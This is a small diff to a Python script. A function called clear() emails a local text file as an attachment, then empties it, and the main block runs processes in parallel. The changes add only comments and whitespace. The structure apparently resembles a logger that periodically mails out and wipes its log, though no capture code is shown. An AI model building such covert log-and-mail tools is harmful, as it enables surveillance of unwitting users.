@@ -119,7 +119,6 @@ def clear():
         message.attach(partTxt)
 
         # Attaching text file and sending.
-
         with open(resource_path(f), 'rb+') as attachment:
             partFile = MIMEBase("application", "octet-stream")
             partFile.set_payload(attachment.read())
@@ -138,6 +137,9 @@ def clear():
                     print("Password or email incorrect/nonexistent.")
             attachment.truncate(0)
             attachment.close()
+
+# The main function takes care of multiprocessing...these functions will run in tandem!
+# It also creates the file instantaneously to avoid any File Not Found errors.
 
 if __name__ == '__main__':
     freeze_support()
